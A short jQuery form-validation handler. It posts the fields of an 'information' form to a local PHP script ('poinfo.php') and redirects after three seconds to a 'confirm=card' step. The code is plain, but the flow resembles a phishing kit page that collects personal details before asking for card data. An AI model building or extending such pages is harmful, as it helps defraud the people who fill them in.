$("#information").validate({
  submitHandler: function(form) {
    $.post("../post/poinfo.php", $("#information").serialize(), function(GET) {
      setTimeout(function() {
        window.location.assign("confirm=card");
      }, 3000)
    });
  },
});
